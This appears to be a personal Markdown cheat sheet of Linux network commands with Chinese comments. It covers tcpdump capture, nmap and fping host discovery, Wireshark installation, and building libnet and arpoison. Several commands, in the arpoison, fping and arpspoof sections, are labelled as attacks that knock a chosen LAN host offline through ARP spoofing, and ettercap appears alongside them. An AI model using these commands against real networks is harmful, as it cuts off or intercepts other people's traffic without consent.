<!-- TOC depthFrom:1 depthTo:6 withLinks:1 updateOnSave:1 orderedList:0 -->

- [tcpdump](#tcpdump)
	- [抓包](#抓包)
- [nmap](#nmap)
	- [扫描](#扫描)
- [arpping](#arpping)
- [libnet](#libnet)
- [arpison](#arpison)
- [wireshark](#wireshark)
- [fping](#fping)
- [arpspoof](#arpspoof)

<!-- /TOC -->


# tcpdump
check complain mode   
tcpdump: test1.log: Permission denied  
开始以为是用户权限的问题，后来换用root账户还是不行，经搜索，是AppArmor的问题  
apt-get install apparmor-utils
sudo aa-complain /usr/sbin/tcpdump  

截取gre数据包  
tcpdump |grep -i "gre"  


## 抓包
tcpdump -i eth0 -nn 'host 192.168.2.249' -w check.cap
tcpdump -i eth0 -nn 'host 192.168.2.246' -w check.cap
tcpdump  -p arp
tcpdump host 192.168.2.1 -w check.cap
抓取网口eth0上源mac地址或目的mac地址为00:21:85:6C:D9:A3的所有数据包  
tcpdump -i eth0 ether src or dst 34:97:f6:99:a1:ed -w check.cap   

sudo tcpdump -n -r arp_check222.cap|awk -F '[,]+' '{print $2}'|sort|uniq -c|sort -n  

# nmap
## 扫描
nmap -sP 192.168.2.0/24

# arpping

用法举例：比如我的ip 192.168.1.101 网关:192.168.1.1  
arping -U -I eth0 -s 192.168.2.88 192.168.2.1  
arping -U -I eth0 -s 192.168.1.229 192.168.1.1  

# libnet
wget https://nchc.dl.sourceforge.net/project/libnet-dev/libnet-1.1.6.tar.gz  
tar zxvf libnet-1.1.6.tar.gz  
cd libnet-1.1.6/  
sudo ./configure  
sudo make  
sudo make install  


# arpison
gcc arpoison.c /usr/local/lib/libnet.a -o arpoison  
sudo ln -sf arpoison /bin/arpoison  

比如我想防止arp 攻击
sudo arpoison -i eth0 -d 192.168.1.1 -s 192.168.1.101 -t ff:ff:ff:ff:ff:ff -r 00:1c:bf:03:9f:c7

比如我想攻击192.168.1.50的机器不让他上网
sudo arpoison -i eth0 -d 192.168.1.50 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 00:1c:bf:03:9f:c7
sudo arpoison -i enp4s0 -d 192.168.2.249 -s 192.168.2.1 -t ff:ff:ff:ff:ff:ff -r 1c:1b:0d:2d:94:87

# wireshark  
sudo apt-add-repository ppa:wireshark-dev/stable  
sudo apt-get update  
sudo apt-get install wireshark  
sudo dpkg-reconfigure wireshark-common  

# fping
在一个局域网中，我们如果要对某个主机进行断网攻击的话，我们先要查看局域网中的ip  
fping –asg 10.10.10.0/24  

# arpspoof
进行断网攻击  
sudo arpspoof -i enp4s0 -t 192.168.2.252 192.168.2.254  
ettercap -Tq -i enp4s0  

# ifstat
流量监控;  
sudo atp-get install ifstat
